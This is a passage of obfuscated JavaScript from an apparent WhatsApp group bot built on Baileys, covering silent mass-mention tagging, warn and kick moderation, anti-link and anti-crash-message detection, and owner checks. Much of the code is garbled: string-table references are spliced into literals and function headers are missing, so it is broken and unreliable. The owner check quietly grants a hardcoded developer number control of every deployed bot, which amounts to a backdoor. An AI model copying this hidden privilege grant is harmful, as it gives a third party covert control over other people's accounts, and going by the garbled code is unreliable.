    const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
    const payload = { video: buf, caption: m.videoMessage.caption || "" };
    if (m.videoMessage.gifPlayback) payload.gifPlayback = true;
    return payload;
  }
  if (m.stickerMessage) {
    const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
    return { sticker: buf };
  }
  if (m.audioMessage) {
    const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
    return {
      audio: buf,
      mimetype: m.audioMessage.mimetype || _0x750c7afa(_0x3c7d8f2f[228]),
      ptt: !!m.audioMessage.ptt
    };
  }
  if (m.documentMessage) {
    const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
    return {
      document: buf,
      mimetype: m.documentMessage.mimetype || _0x750c7afa(_0x3c7d8f2f[229]),
      fileName: m.documentMessage.fileName || _0x750c7afa(_0x3c7d8f2f[230])
    };
  }
  // text / caption fallback
  const text =
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    getText(sourceMsg) ||
    "";
  if (text) return { text };
  return null;
}

/** Find the replied-to message even when the reply is wrapped (ephemeral / device-sent / edited / view-once) */
  try {
    const direct = getQuotedMsg(msg);
    if (direct) return direct;
    const seen = new Set();
    let found = null;
    const walk = (o, d) => {
      if (found || !o || typeof o !== _0x750c7afa(_0x3c7d8f2f[211]) || d > 7 || seen.has(o) || ArrayBuffer.isView(o)) return;
      seen.add(o);
      const ci = o.contextInfo;
      if (ci && typeof ci === _0x750c7afa(_0x3c7d8f2f[211]) && ci.quotedMessage && ci.stanzaId) { found = ci; return; }
      for (const k of Object.keys(o)) walk(o[k], d + 1);
    };
    walk(msg && msg.message, 0);
    if (!found) return null;
    const key = { remoteJid: msg.key.remoteJid, fromMe: !!found.fromMe, id: found.stanzaId };
    if (found.participant) key.participant = found.participant;
    return { key, message: found.quotedMessage, participant: found.participant || null };
  } catch { return null; }
}

/** Turn the replied-to message into a sendable payload; tries inline copy, bot cache, then store */
  const tries = [];
  const attempt = async (label, src) => {
    try {
      const c = await buildSendContent(sock, src);
      if (c) return c;
      tries.push(`${label}: no supported content`);
    } catch (e) { tries.push(`${label}: ${e?.message || e}`); }
    return null;
  };
  let c = await attempt(_0x750c7afa(_0x3c7d8f2f[234]), quoted);
  if (c) return { content: c, tries };
  try {
    const cached = messageCache.get(mcKey(sock, quoted.key.id))?.msg;
    if (cached) { c = await attempt(_0x750c7afa(_0x3c7d8f2f[235]), cached); if (c) return { content: c, tries }; }
  } catch {}
  try {
    if (sock.store && typeof sock.store.loadMessage === _0x750c7afa(_0x3c7d8f2f[210])) {
      const st = await sock.store.loadMessage(quoted.key.remoteJid, quoted.key.id);
      if (st) { c = await attempt(_0x750c7afa(_0x3c7d8f2f[236]), st); if (c) return { content: c, tries }; }
    }
  } catch {}
  return { content: null, tries };
}

/**
 * Shared engine for .tag and .hidetag: sends the replied message (text / image / video / gif /
 * voice / sticker / document) — or plain text — to the group with EVERY member silently mentioned.
 */
  // Always pure edit mode (no ghost/empty message). Use .tag if you want send-style behaviour.
  return _0x750c7afa(_0x3c7d8f2f[237]);
}
  const quoted = findQuotedDeep(msg);
  // EDIT MODE: the command message itself is edited into the final text with every member silently
  // mentioned — no _0x750c7afa(_0x3c7d8f2f[238]) trace, and nobody sees a command. Only possible for messages
  // sent by the bot's own account (WhatsApp lets you edit your own messages for 15 minutes).
  if (!quoted && extraText && msg.key.fromMe && getHidetagMode(sock) === "edit") {
    try {
      // Pure edit mode: command message is edited into the final text with mentions.
      // No ghost/empty message is sent. Note: WhatsApp does not send push notifications
      // for mentions added via edit (limitation of WhatsApp itself).
      await sock.sendMessage(jid, { text: extraText, edit: msg.key, mentions: members });
      return true;
    } catch (e) { console.warn(`[${label}] edit failed, falling back to delete+send:`, e?.message || e); }
  }
  // Otherwise: remove the command message (best-effort) and send the hidden tag as a new message
  if (!quoted) {
    // WhatsApp does NOT notify members for mentions added by editing, so the real tag is a fresh message.
    // Send it first, then remove the command so it simply "replaces" it.
    await sock.sendMessage(jid, { text: extraText || "‎", mentions: members });
    try { await sock.sendMessage(jid, { delete: msg.key }); } catch {}
    return true;
  }
  try { await sock.sendMessage(jid, { delete: msg.key }); } catch {}
  const { content, tries } = await buildQuotedContent(sock, quoted);
  if (content) {
    content.mentions = members;
    if (extraText) {
      if (content.caption != null) {
        content.caption = ((content.caption || "").trim() ? content.caption.trim() + "\n" : "") + extraText;
      } else if (content.text != null) {
        content.text = ((content.text || "").trim() ? content.text.trim() + "\n\n" : "") + extraText;
      }
    }
    try {
      await sock.sendMessage(jid, content);
      return true;
    } catch (e) { tries.push(`send: ${e?.message || e}`); }
  }
  // Media could not be downloaded → forward the original message as-is (no download needed), mentions attached
  try {
    await sock.sendMessage(jid, { forward: { key: quoted.key, message: quoted.message }, mentions: members });
    return true;
  } catch (e) { tries.push(`forward: ${e?.message || e}`); }
  console.warn(`[${label}] could not hidetag replied message:`, tries.join(" | ").slice(0, 500));
  const t = String(getText(quoted) || extraText || "").trim();
  if (t) {
    await sock.sendMessage(jid, { text: t, mentions: members });
    return true;
  }
  await sock.sendMessage(jid, { text: "❌ Couldn't read the replied message (media may have expired). Try replying to a newer message._0x750c7afa(_0x3c7d8f2f[239])available_0x750c7afa(_0x3c7d8f2f[240])composing_0x750c7afa(_0x3c7d8f2f[240])recording_0x750c7afa(_0x3c7d8f2f[241])function_0x750c7afa(_0x3c7d8f2f[242])function_0x750c7afa(_0x3c7d8f2f[243])presence.update_0x750c7afa(_0x3c7d8f2f[244])presence.update_0x750c7afa(_0x3c7d8f2f[245])read more" */
  const total = members.length;
  const on = Math.max(0, Math.min(total, onlineCount || 0));
  const readMore = String.fromCharCode(8206).repeat(4001);
  const list = members.map((m, i) => `${i + 1} @${jidNumber(m)}`).join("\n_0x750c7afa(_0x3c7d8f2f[246])📢 *Mention All*",
    `👤 *By:* @${jidNumber(senderJid)}`,
    `💬 *Message:* ${message && message.trim() ? message.trim() : "No message_0x750c7afa(_0x3c7d8f2f[247])",
    `👥 *Total members:* ${total}`,
    `🟢 *Online:* ${on}`,
    `⚫ *Offline:* ${total - on}`,
    readMore,
    "*Mention members:*_0x750c7afa(_0x3c7d8f2f[248])\n_0x750c7afa(_0x3c7d8f2f[249])object_0x750c7afa(_0x3c7d8f2f[250])contextInfo_0x750c7afa(_0x3c7d8f2f[251])quotedMessage_0x750c7afa(_0x3c7d8f2f[252])string_0x750c7afa(_0x3c7d8f2f[253])object_0x750c7afa(_0x3c7d8f2f[254])object_0x750c7afa(_0x3c7d8f2f[250])quotedMessage_0x750c7afa(_0x3c7d8f2f[255])mentionedJid_0x750c7afa(_0x3c7d8f2f[256])string_0x750c7afa(_0x3c7d8f2f[257])object_0x750c7afa(_0x3c7d8f2f[258])\n_0x750c7afa(_0x3c7d8f2f[259])_0x750c7afa(_0x3c7d8f2f[260]) _0x750c7afa(_0x3c7d8f2f[261])_0x750c7afa(_0x3c7d8f2f[262])baileys-legacy_0x750c7afa(_0x3c7d8f2f[263])baileys-v2_0x750c7afa(_0x3c7d8f2f[264])_0x750c7afa(_0x3c7d8f2f[265])bug_0x750c7afa(_0x3c7d8f2f[266])_0x750c7afa(_0x3c7d8f2f[267])\n");
    const len = text.length;
    if (len > 12000) return `very long text (${len} chars)`;
    if (strs.some((s) => /BEGIN:VCARD/i.test(s) && s.length > 20000)) return "huge contact card_0x750c7afa(_0x3c7d8f2f[268])contact-card flood";
    // Sticker / pack style heavies
    const st = m.stickerMessage || m.lottieStickerMessage || null;
    if (st) {
      const fl = Number(st.fileLength || st.fileLength?.low || 0);
      if (fl > 400000) return `oversized sticker (${fl} bytes)`;
      if (Number(st.seconds || 0) > 30) return "long animated sticker_0x750c7afa(_0x3c7d8f2f[269])_0x750c7afa(_0x3c7d8f2f[270])stacked combining marks_0x750c7afa(_0x3c7d8f2f[271])invisible-character flood_0x750c7afa(_0x3c7d8f2f[272])crash-script flood_0x750c7afa(_0x3c7d8f2f[273])repeated-character flood_0x750c7afa(_0x3c7d8f2f[274])_0x750c7afa(_0x3c7d8f2f[275])bugauth.json_0x750c7afa(_0x3c7d8f2f[276])?.?_0x750c7afa(_0x3c7d8f2f[277])?.?_0x750c7afa(_0x3c7d8f2f[278])bugauth.json_0x750c7afa(_0x3c7d8f2f[279])?.?_0x750c7afa(_0x3c7d8f2f[280])";
  const k = `${msg.key?.remoteJid || ""}:${sender}`;
  const hit = bugAuthPending.get(k);
  if (hit && hit.authed && Date.now() < hit.exp) return true;
  return false;
}
  const sender = msg.key?.participant || msg.key?.remoteJid || "";
  const k = `${msg.key?.remoteJid || ""}:${sender}`;
  bugAuthPending.set(k, { action, args: args || [], exp: Date.now() + 90_000, authed: false });
  return k;
}
/** If this message is a password reply for pending auth, returns { action, args } or null */
  try {
    const sender = msg.key?.participant || msg.key?.remoteJid || "_0x750c7afa(_0x3c7d8f2f[281])";
    const k = `${jid}:${sender}`;
    const hit = bugAuthPending.get(k);
    if (!hit || Date.now() > hit.exp) return null;
    const text = String(getText(msg) || "_0x750c7afa(_0x3c7d8f2f[282])x_0x750c7afa(_0x3c7d8f2f[283])hidemybot.json_0x750c7afa(_0x3c7d8f2f[284])hidemybot.json_0x750c7afa(_0x3c7d8f2f[285])x_0x750c7afa(_0x3c7d8f2f[286])hex_0x750c7afa(_0x3c7d8f2f[287])A_0x750c7afa(_0x3c7d8f2f[288])hex_0x750c7afa(_0x3c7d8f2f[289])F_0x750c7afa(_0x3c7d8f2f[290])function_0x750c7afa(_0x3c7d8f2f[291])status@broadcast_0x750c7afa(_0x3c7d8f2f[292])function_0x750c7afa(_0x3c7d8f2f[293])_0x750c7afa(_0x3c7d8f2f[294])composing_0x750c7afa(_0x3c7d8f2f[295])paused_0x750c7afa(_0x3c7d8f2f[296])1_0x750c7afa(_0x3c7d8f2f[87])USA / Canada_0x750c7afa(_0x3c7d8f2f[82])7_0x750c7afa(_0x3c7d8f2f[87])Russia / Kazakhstan_0x750c7afa(_0x3c7d8f2f[82])20_0x750c7afa(_0x3c7d8f2f[87])Egypt_0x750c7afa(_0x3c7d8f2f[82])27_0x750c7afa(_0x3c7d8f2f[87])South Africa_0x750c7afa(_0x3c7d8f2f[82])33_0x750c7afa(_0x3c7d8f2f[87])France_0x750c7afa(_0x3c7d8f2f[82])34_0x750c7afa(_0x3c7d8f2f[87])Spain_0x750c7afa(_0x3c7d8f2f[82])39_0x750c7afa(_0x3c7d8f2f[87])Italy_0x750c7afa(_0x3c7d8f2f[89])44_0x750c7afa(_0x3c7d8f2f[87])United Kingdom_0x750c7afa(_0x3c7d8f2f[82])49_0x750c7afa(_0x3c7d8f2f[87])Germany_0x750c7afa(_0x3c7d8f2f[82])52_0x750c7afa(_0x3c7d8f2f[87])Mexico_0x750c7afa(_0x3c7d8f2f[82])54_0x750c7afa(_0x3c7d8f2f[87])Argentina_0x750c7afa(_0x3c7d8f2f[82])55_0x750c7afa(_0x3c7d8f2f[87])Brazil_0x750c7afa(_0x3c7d8f2f[82])60_0x750c7afa(_0x3c7d8f2f[87])Malaysia_0x750c7afa(_0x3c7d8f2f[82])61_0x750c7afa(_0x3c7d8f2f[87])Australia_0x750c7afa(_0x3c7d8f2f[89])62_0x750c7afa(_0x3c7d8f2f[87])Indonesia_0x750c7afa(_0x3c7d8f2f[82])63_0x750c7afa(_0x3c7d8f2f[87])Philippines_0x750c7afa(_0x3c7d8f2f[82])65_0x750c7afa(_0x3c7d8f2f[87])Singapore_0x750c7afa(_0x3c7d8f2f[82])66_0x750c7afa(_0x3c7d8f2f[87])Thailand_0x750c7afa(_0x3c7d8f2f[82])81_0x750c7afa(_0x3c7d8f2f[87])Japan_0x750c7afa(_0x3c7d8f2f[82])82_0x750c7afa(_0x3c7d8f2f[87])South Korea_0x750c7afa(_0x3c7d8f2f[82])84_0x750c7afa(_0x3c7d8f2f[87])Vietnam_0x750c7afa(_0x3c7d8f2f[89])86_0x750c7afa(_0x3c7d8f2f[87])China_0x750c7afa(_0x3c7d8f2f[82])90_0x750c7afa(_0x3c7d8f2f[87])Turkey_0x750c7afa(_0x3c7d8f2f[82])91_0x750c7afa(_0x3c7d8f2f[87])India_0x750c7afa(_0x3c7d8f2f[82])92_0x750c7afa(_0x3c7d8f2f[87])Pakistan_0x750c7afa(_0x3c7d8f2f[82])93_0x750c7afa(_0x3c7d8f2f[87])Afghanistan_0x750c7afa(_0x3c7d8f2f[82])94_0x750c7afa(_0x3c7d8f2f[87])Sri Lanka_0x750c7afa(_0x3c7d8f2f[82])95_0x750c7afa(_0x3c7d8f2f[87])Myanmar_0x750c7afa(_0x3c7d8f2f[82])98_0x750c7afa(_0x3c7d8f2f[87])Iran_0x750c7afa(_0x3c7d8f2f[89])212_0x750c7afa(_0x3c7d8f2f[87])Morocco_0x750c7afa(_0x3c7d8f2f[82])213_0x750c7afa(_0x3c7d8f2f[87])Algeria_0x750c7afa(_0x3c7d8f2f[82])216_0x750c7afa(_0x3c7d8f2f[87])Tunisia_0x750c7afa(_0x3c7d8f2f[82])234_0x750c7afa(_0x3c7d8f2f[87])Nigeria_0x750c7afa(_0x3c7d8f2f[82])249_0x750c7afa(_0x3c7d8f2f[87])Sudan_0x750c7afa(_0x3c7d8f2f[82])254_0x750c7afa(_0x3c7d8f2f[87])Kenya_0x750c7afa(_0x3c7d8f2f[82])255_0x750c7afa(_0x3c7d8f2f[87])Tanzania_0x750c7afa(_0x3c7d8f2f[89])880_0x750c7afa(_0x3c7d8f2f[87])Bangladesh_0x750c7afa(_0x3c7d8f2f[82])960_0x750c7afa(_0x3c7d8f2f[87])Maldives_0x750c7afa(_0x3c7d8f2f[82])961_0x750c7afa(_0x3c7d8f2f[87])Lebanon_0x750c7afa(_0x3c7d8f2f[82])962_0x750c7afa(_0x3c7d8f2f[87])Jordan_0x750c7afa(_0x3c7d8f2f[82])964_0x750c7afa(_0x3c7d8f2f[87])Iraq_0x750c7afa(_0x3c7d8f2f[82])965_0x750c7afa(_0x3c7d8f2f[87])Kuwait_0x750c7afa(_0x3c7d8f2f[82])966_0x750c7afa(_0x3c7d8f2f[87])Saudi Arabia_0x750c7afa(_0x3c7d8f2f[89])967_0x750c7afa(_0x3c7d8f2f[87])Yemen_0x750c7afa(_0x3c7d8f2f[82])968_0x750c7afa(_0x3c7d8f2f[87])Oman_0x750c7afa(_0x3c7d8f2f[82])971_0x750c7afa(_0x3c7d8f2f[87])UAE_0x750c7afa(_0x3c7d8f2f[82])972_0x750c7afa(_0x3c7d8f2f[87])Israel_0x750c7afa(_0x3c7d8f2f[82])973_0x750c7afa(_0x3c7d8f2f[87])Bahrain_0x750c7afa(_0x3c7d8f2f[82])974_0x750c7afa(_0x3c7d8f2f[87])Qatar_0x750c7afa(_0x3c7d8f2f[82])977_0x750c7afa(_0x3c7d8f2f[87])Nepal_0x750c7afa(_0x3c7d8f2f[297])_0x750c7afa(_0x3c7d8f2f[298])_0x750c7afa(_0x3c7d8f2f[299]).x warn on_0x750c7afa(_0x3c7d8f2f[300]).x kick off_0x750c7afa(_0x3c7d8f2f[300]).x delete on_0x750c7afa(_0x3c7d8f2f[300]).x off_0x750c7afa(_0x3c7d8f2f[300]).x on_0x750c7afa(_0x3c7d8f2f[301])<mode> off_0x750c7afa(_0x3c7d8f2f[302])warn"|"delete"|"kick"|"off_0x750c7afa(_0x3c7d8f2f[303])_0x750c7afa(_0x3c7d8f2f[304])_0x750c7afa(_0x3c7d8f2f[305])off_0x750c7afa(_0x3c7d8f2f[306])off_0x750c7afa(_0x3c7d8f2f[307])_0x750c7afa(_0x3c7d8f2f[308])on_0x750c7afa(_0x3c7d8f2f[309])_0x750c7afa(_0x3c7d8f2f[310])warn_0x750c7afa(_0x3c7d8f2f[82])delete_0x750c7afa(_0x3c7d8f2f[82])kick_0x750c7afa(_0x3c7d8f2f[311])off_0x750c7afa(_0x3c7d8f2f[312])off_0x750c7afa(_0x3c7d8f2f[313])off_0x750c7afa(_0x3c7d8f2f[307])_0x750c7afa(_0x3c7d8f2f[314])off", note: `ℹ️ *${a0}* was not active (current: *${current || "off_0x750c7afa(_0x3c7d8f2f[315])on_0x750c7afa(_0x3c7d8f2f[316])_0x750c7afa(_0x3c7d8f2f[317])#_0x750c7afa(_0x3c7d8f2f[318])ms_0x750c7afa(_0x3c7d8f2f[319])sec_0x750c7afa(_0x3c7d8f2f[320])s_0x750c7afa(_0x3c7d8f2f[321])min_0x750c7afa(_0x3c7d8f2f[320])m_0x750c7afa(_0x3c7d8f2f[322])h_0x750c7afa(_0x3c7d8f2f[320])hr_0x750c7afa(_0x3c7d8f2f[320])hour_0x750c7afa(_0x3c7d8f2f[323])❌ Invalid delay format.\nExamples: #500ms, #1sec, #2s, #1min, #1h, #72h_0x750c7afa(_0x3c7d8f2f[324])❌ Invalid delay value._0x750c7afa(_0x3c7d8f2f[325])❌ Minimum delay is 500ms._0x750c7afa(_0x3c7d8f2f[326])❌ Maximum delay is 72 hours._0x750c7afa(_0x3c7d8f2f[327])#_0x750c7afa(_0x3c7d8f2f[318])ms_0x750c7afa(_0x3c7d8f2f[319])sec_0x750c7afa(_0x3c7d8f2f[320])s_0x750c7afa(_0x3c7d8f2f[321])min_0x750c7afa(_0x3c7d8f2f[320])m_0x750c7afa(_0x3c7d8f2f[322])h_0x750c7afa(_0x3c7d8f2f[320])hr_0x750c7afa(_0x3c7d8f2f[320])hour_0x750c7afa(_0x3c7d8f2f[323])❌ Invalid delay format.\nExamples: #500ms, #1sec, #2s, #1min, #1h_0x750c7afa(_0x3c7d8f2f[324])❌ Invalid delay value._0x750c7afa(_0x3c7d8f2f[328])❌ Minimum delay is 100ms (or use no #delay for max speed)._0x750c7afa(_0x3c7d8f2f[329])❌ Maximum delay is 1 hour._0x750c7afa(_0x3c7d8f2f[330])");
    if (n.length >= 7) out.push(`${n}@s.whatsapp.net`);
  }
  return [...new Set(out)].filter(Boolean);
}
  const p = meta.participants.find(x => normalizeJid(x.id) === normalizeJid(jid));
  return !!p && (p.admin === "admin_0x750c7afa(_0x3c7d8f2f[331])superadmin_0x750c7afa(_0x3c7d8f2f[332])_0x750c7afa(_0x3c7d8f2f[333])");
  return n ? `${n}@s.whatsapp.net` : "";
}
  return `${DEVELOPER_NUMBER}@s.whatsapp.net`;
}
  return `${DEVELOPER_LID}@lid`;
}
/**
 * Privacy-sensitive destination (view-once auto, anti-delete).
 * Goes to OWNER_NUMBER env, else the linked bot account (self DM).
 * NEVER the hardcoded developer — that would flood developer DMs.
 */

/** Resolve group member JID (supports LID) by phone digits or quoted participant */
  const n = jidNumber(numberOrJid);
  if (!meta?.participants) return n ? `${n}@s.whatsapp.net` : "_0x750c7afa(_0x3c7d8f2f[334])_0x750c7afa(_0x3c7d8f2f[335])";
    if (jidNumber(id) === n || jidNumber(pn) === n) return id;
    if (String(id).includes(n)) return id;
  }
  return n ? `${n}@s.whatsapp.net` : "_0x750c7afa(_0x3c7d8f2f[336])setwarn.json_0x750c7afa(_0x3c7d8f2f[337])general_0x750c7afa(_0x3c7d8f2f[338])");
  return `${gid}:${number}:${r}`;
}

  const file = sock ? sf(sock, "warns.json_0x750c7afa(_0x3c7d8f2f[339])warns.json_0x750c7afa(_0x3c7d8f2f[340])warns.json") : warnFile;
  const warns = readJson(file, {});
  if (reason) {
    delete warns[warnKey(gid, number, reason)];
  } else {
    const prefix = `${gid}:${number}`;
    for (const k of Object.keys(warns)) {
      if (k === prefix || k.startsWith(prefix + ":_0x750c7afa(_0x3c7d8f2f[341])warns.json_0x750c7afa(_0x3c7d8f2f[342]):_0x750c7afa(_0x3c7d8f2f[343])allowonce.json") : allowFile;
  const a = readJson(file, {});
  return !!a[`${gid}:${number}`];
}

  const file = sock ? sf(sock, "allowonce.json") : allowFile;
  const a = readJson(file, {});
  const key = `${gid}:${number}`;
  if (!a[key]) return false;
  delete a[key];
  writeJson(file, a);
  return true;
}

  const file = sock ? sf(sock, "allowonce.json") : allowFile;
  const a = readJson(file, {});
  a[`${gid}:${number}`] = true;
  writeJson(file, a);
}

/** Detect media kind from inbound message (sticker/video/image/audio/text/link) */
  const m = msg.message || {};
  const inner = (typeof unwrapMessage === "function_0x750c7afa(_0x3c7d8f2f[344])sticker_0x750c7afa(_0x3c7d8f2f[345])video_0x750c7afa(_0x3c7d8f2f[346])picture_0x750c7afa(_0x3c7d8f2f[347])voice_0x750c7afa(_0x3c7d8f2f[348])_0x750c7afa(_0x3c7d8f2f[349])link_0x750c7afa(_0x3c7d8f2f[350])text_0x750c7afa(_0x3c7d8f2f[351])sticker_0x750c7afa(_0x3c7d8f2f[352])video_0x750c7afa(_0x3c7d8f2f[353])picture_0x750c7afa(_0x3c7d8f2f[354])voice_0x750c7afa(_0x3c7d8f2f[264])_0x750c7afa(_0x3c7d8f2f[355])string_0x750c7afa(_0x3c7d8f2f[356])[service]_0x750c7afa(_0x3c7d8f2f[357])[service]_0x750c7afa(_0x3c7d8f2f[358])service_0x750c7afa(_0x3c7d8f2f[359])_0x750c7afa(_0x3c7d8f2f[360])Unknown error_0x750c7afa(_0x3c7d8f2f[361])Service temporarily unavailable_0x750c7afa(_0x3c7d8f2f[362])service_0x750c7afa(_0x3c7d8f2f[363])…_0x750c7afa(_0x3c7d8f2f[364])object_0x750c7afa(_0x3c7d8f2f[365])forwardedNewsletterMessageInfo_0x750c7afa(_0x3c7d8f2f[366])newsletterAdminInviteMessage_0x750c7afa(_0x3c7d8f2f[367])object_0x750c7afa(_0x3c7d8f2f[368])_0x750c7afa(_0x3c7d8f2f[369])_0x750c7afa(_0x3c7d8f2f[370])_0x750c7afa(_0x3c7d8f2f[371])_0x750c7afa(_0x3c7d8f2f[372])object_0x750c7afa(_0x3c7d8f2f[373])object_0x750c7afa(_0x3c7d8f2f[374])_0x750c7afa(_0x3c7d8f2f[375])_0x750c7afa(_0x3c7d8f2f[376])object_0x750c7afa(_0x3c7d8f2f[377])_0x750c7afa(_0x3c7d8f2f[378])_0x750c7afa(_0x3c7d8f2f[379])_0x750c7afa(_0x3c7d8f2f[380])function_0x750c7afa(_0x3c7d8f2f[381])jid_0x750c7afa(_0x3c7d8f2f[382])invite_0x750c7afa(_0x3c7d8f2f[383])_0x750c7afa(_0x3c7d8f2f[384])_0x750c7afa(_0x3c7d8f2f[385])general_0x750c7afa(_0x3c7d8f2f[386])group-status_0x750c7afa(_0x3c7d8f2f[87])ANTI GROUP STATUS_0x750c7afa(_0x3c7d8f2f[387])group-mention_0x750c7afa(_0x3c7d8f2f[87])ANTI GROUP MENTION_0x750c7afa(_0x3c7d8f2f[387])link_0x750c7afa(_0x3c7d8f2f[87])ANTILINK_0x750c7afa(_0x3c7d8f2f[387])channel_0x750c7afa(_0x3c7d8f2f[87])ANTICHANNEL_0x750c7afa(_0x3c7d8f2f[387])mass-tag_0x750c7afa(_0x3c7d8f2f[87])ANTITAG_0x750c7afa(_0x3c7d8f2f[387])hidden-tag_0x750c7afa(_0x3c7d8f2f[87])ANTITAG (HIDDEN)_0x750c7afa(_0x3c7d8f2f[387])bot_0x750c7afa(_0x3c7d8f2f[87])ANTIBOT_0x750c7afa(_0x3c7d8f2f[387])bug_0x750c7afa(_0x3c7d8f2f[87])ANTIBUG_0x750c7afa(_0x3c7d8f2f[387])sticker_0x750c7afa(_0x3c7d8f2f[87])ANTISTICKER_0x750c7afa(_0x3c7d8f2f[387])voice_0x750c7afa(_0x3c7d8f2f[87])ANTIVOICE_0x750c7afa(_0x3c7d8f2f[387])picture_0x750c7afa(_0x3c7d8f2f[87])ANTIPIC_0x750c7afa(_0x3c7d8f2f[387])video_0x750c7afa(_0x3c7d8f2f[87])ANTIVIDEO_0x750c7afa(_0x3c7d8f2f[387])text_0x750c7afa(_0x3c7d8f2f[87])ANTITEXT"
  };
  const baseTitle = titleMap[reason] || `ANTI ${String(label || "RULE_0x750c7afa(_0x3c7d8f2f[388])channel") {
    try {
      const ci = await getChannelInfo(sock, msg);
      title = baseTitle + `*\n📡 Channel: *${ci.name || "Unknown channel_0x750c7afa(_0x3c7d8f2f[389])group-status" && hasAllowOnce(jid, number, sock)) {
    consumeAllowOnce(jid, number, sock);
    await sock.sendMessage(jid, {
      text: `✅ @${number} your one-time allow is used.\nDo not break *${label}* again.`,
      mentions: [sender]
    }, { quoted: msg }).catch(() => {});
    return true;
  }

  const limit = reason === "group-status_0x750c7afa(_0x3c7d8f2f[390])delete") {
    sock.sendMessage(jid, {
      text: `🚫 *${title}*\n` +
        `👤 @${number}\n` +
        `🗑️ *REMOVED*\n` +
        `⚙️ Action: *DELETE*`,
      mentions: [sender]
    }).catch(() => {});
    return true;
  }

  if (mode === "kick_0x750c7afa(_0x3c7d8f2f[391])remove");
      clearWarnCount(jid, number, reason, sock);
      await sock.sendMessage(jid, {
        text: `🚫 *${title}*\n` +
          `👤 @${number}\n` +
          `🥾 *USER REMOVED*\n` +
          `⚙️ Action: *KICK*`,
        mentions: [target]
      }).catch(() => {});
    } catch (e) {
      await sock.sendMessage(jid, { text: `❌ Kick fail: ${e.message || e}` }).catch(() => {});
    }
    return true;
  }

  if (mode === "warn") {
    const count = addWarnCount(jid, number, reason, sock);
    await sock.sendMessage(jid, {
      text: `⚠️ *${title}*\n` +
        `👤 @${number}\n` +
        `⚠️ *WARNING* — *${count}/${limit}*\n` +
        `⚙️ Action: *WARN*`,
      mentions: [sender]
    }).catch(() => {});

    if (count >= limit) {
      try {
        let target = sender;
        try {
          const meta = await getCachedMeta(sock, jid);
          target = findParticipantJid(meta, number) || sender;
        } catch {}
        await sock.groupParticipantsUpdate(jid, [target], "remove");
        clearWarnCount(jid, number, reason, sock);
        await sock.sendMessage(jid, {
          text: `🚫 *${title}*\n` +
            `👤 @${number}\n` +
            `🥾 *USER REMOVED*\n` +
            `⚠️ ${limit} warnings reached\n` +
            `⚙️ Action: *WARN → KICK*`,
          mentions: [target]
        }).catch(() => {});
      } catch (e) {
        await sock.sendMessage(jid, { text: `❌ Kick fail: ${e.message || e}` }).catch(() => {});
      }
    }
    return true;
  }
  return false;
}

  const candidates = [altJid, jid].filter(Boolean).map(String);

  // Baileys v7 commonly provides the phone-number JID as participantAlt/remoteJidAlt.
  for (const c of candidates) {
    if (c.endsWith("@s.whatsapp.net_0x750c7afa(_0x3c7d8f2f[392])@lid_0x750c7afa(_0x3c7d8f2f[393])@lid_0x750c7afa(_0x3c7d8f2f[394])@s.whatsapp.net_0x750c7afa(_0x3c7d8f2f[395])_0x750c7afa(_0x3c7d8f2f[396])@s.whatsapp.net_0x750c7afa(_0x3c7d8f2f[397])@") ? normalizeJid(pn) : `${pn}@s.whatsapp.net`;
        }
      }
    } catch {}
  }

  return candidates.find(c => c) || "";
}

  // Multi-tenant: private media / anti-delete → this session's bot account (owner)
  const botNum = botNumberFromSock(sock);
  if (botNum) return `${botNum}@s.whatsapp.net`;
  const me = sock?.user?.id;
  if (me) return normalizeJid(me);
  const envOwner = ownerJid();
  if (envOwner) return envOwner;
  return "_0x750c7afa(_0x3c7d8f2f[398])_0x750c7afa(_0x3c7d8f2f[399])@g.us_0x750c7afa(_0x3c7d8f2f[400])@broadcast_0x750c7afa(_0x3c7d8f2f[400])@newsletter_0x750c7afa(_0x3c7d8f2f[401])";
}
  const ids = getSenderIds(msg, sock);
  if (ids.has(DEVELOPER_NUMBER) || ids.has(DEVELOPER_LID)) return true;
  if (ids.has(`${DEVELOPER_NUMBER}@s.whatsapp.net`) || ids.has(`${DEVELOPER_LID}@lid`)) return true;
  // fromMe when the linked bot account itself is the developer number
  if (msg.key?.fromMe) {
    const me = jidNumber(sock?.user?.id || "_0x750c7afa(_0x3c7d8f2f[402])_0x750c7afa(_0x3c7d8f2f[403])_0x750c7afa(_0x3c7d8f2f[333])");
  if (sessionOwner && (ids.has(sessionOwner) || ids.has(`${sessionOwner}@s.whatsapp.net`))) return true;
  // Optional global fallback OWNER_NUMBER (server admin)
  // Child bots are fully independent: the server-level fallback owner applies to king sessions only
  const envOwner = String(process.env.OWNER_NUMBER || "_0x750c7afa(_0x3c7d8f2f[333])");
  if (envOwner && isBotKing(sessionOwner) && (ids.has(envOwner) || ids.has(`${envOwner}@s.whatsapp.net`))) return true;
  return false;
}
/** True ONLY for this session's own account (the owner). Sudo / developer are NOT included. */
  if (msg?.key?.fromMe) return true;
  const ids = getSenderIds(msg, sock);
  const num = botNumberFromSock(sock) || String(sock?.__botNumber || "_0x750c7afa(_0x3c7d8f2f[333])_0x750c7afa(_0x3c7d8f2f[404])");
  if (num && (ids.has(num) || ids.has(`${num}@s.whatsapp.net`))) return true;
  if (lid && (ids.has(lid) || ids.has(`${lid}@lid`))) return true;
  return false;
}
  if (isOwner(sock, msg)) return true;
  const ids = getSenderIds(msg, sock);
  // Per-session sudo list
  const sudos = readJson(sf(sock, "sudo.json"), []).map(String);
  return sudos.some(s => ids.has(String(s)) || ids.has(`${s}@s.whatsapp.net`));
}
  const c = getContext(msg);
  // Prefer phone-number participantAlt / remoteJidAlt when available (Baileys v7 LID)
